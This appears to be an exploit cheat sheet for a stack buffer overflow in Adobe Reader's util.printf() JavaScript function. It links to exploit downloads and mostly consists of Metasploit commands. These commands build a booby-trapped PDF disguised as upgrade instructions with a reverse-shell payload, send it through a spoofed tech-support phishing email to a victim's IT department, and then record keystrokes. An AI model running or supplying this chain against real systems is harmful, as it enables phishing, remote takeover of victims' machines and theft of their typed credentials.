Adobe Reader 'util.printf()' JavaScript Function Stack Buffer Overflow Vulnerability

Adobe Reader is prone to a stack-based buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data. 

An attacker can exploit this issue to execute arbitrary code with the privileges of the user running the application or crash the application, denying service to legitimate users.

[Exploit Download]

http://www.securityfocus.com/data/vulnerabilities/exploits/30035.zip
http://www.securityfocus.com/data/vulnerabilities/exploits/30035.c
https://www.immunityinc.com/downloads/immpartners/acrobat_js3.tgz


[Solution]

A vendor update is available. Please see the references for more information


http://www.securityfocus.com/bid/30035



[METASPLOIT]

-> msf > use exploit/windows/fileformat/adobe_utilprintf
-> msf exploit(adobe_utilprintf) > set FILENAME BestComputers-UpgradeInstructions.pdf
		-FILENAME => BestComputers-UpgradeInstructions.pdf
-> msf exploit(adobe_utilprintf) > set PAYLOAD windows/meterpreter/reverse_tcp
		-PAYLOAD => windows/meterpreter/reverse_tcp
-> msf exploit(adobe_utilprintf) > set LHOST 192.168.8.128
		-LHOST => 192.168.8.128
-> msf exploit(adobe_utilprintf) > set LPORT 4455
		-LPORT => 4455
-> msf exploit(adobe_utilprintf) > show options
-> msf exploit(adobe_utilprintf) > exploit

-> msf > use exploit/multi/handler
-> msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
		-PAYLOAD => windows/meterpreter/reverse_tcp
-> msf exploit(handler) > set LPORT 4455
		-LPORT => 4455
-> msf exploit(handler) > set LHOST 192.168.8.128
		-LHOST => 192.168.8.128
-> msf exploit(handler) > exploit

-> sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf

[Post]

-> meterpreter > run post/windows/manage/migrate 
-> meterpreter > run post/windows/capture/keylog_recorder 


